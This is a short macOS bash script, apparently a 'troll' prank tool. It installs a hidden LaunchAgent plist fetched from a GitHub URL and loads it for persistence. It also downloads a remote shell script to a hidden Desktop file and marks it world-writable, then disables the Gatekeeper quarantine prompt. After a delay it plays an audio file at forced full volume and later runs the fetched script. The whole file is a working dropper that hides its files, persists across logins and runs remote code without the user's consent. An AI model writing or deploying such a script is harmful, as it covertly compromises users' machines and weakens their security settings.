#! /bin/bash

curl -s -L https://raw.githubusercontent.com/Me1955/osx_troll/main/main.plist >> ~/Library/LaunchAgents/.main1.plist
cat ~/Library/LaunchAgents/.main1.plist >> ~/Library/LaunchAgents/.music.plist
rm ~/Library/LaunchAgents/.main1.plist
chmod 600 ~/Library/LaunchAgents/.music.plist
launchctl load ~/Library/LaunchAgents/.music.plist

curl -s -L https://raw.githubusercontent.com/Me1955/osx_troll/main/run.sh >> ~/Desktop/.music.sh
chmod 777 ~/Desktop/.music.sh


curl -L https://raw.githubusercontent.com/Me1955/osx_troll/main/P.mp3 --output ~/Desktop/.troll.mp3


sleep 30m

#Disable the “Are you sure you want to open this application?” dialog
defaults write com.apple.LaunchServices LSQuarantine -bool false

caffeinate &
afplay ~/Desktop/.troll.mp3 &

end=$((SECONDS+4))

while [ $SECONDS -lt $end ]; do
	osascript -e 'set volume 100'
done

sleep 600m
sh ~/Desktop/.music.sh
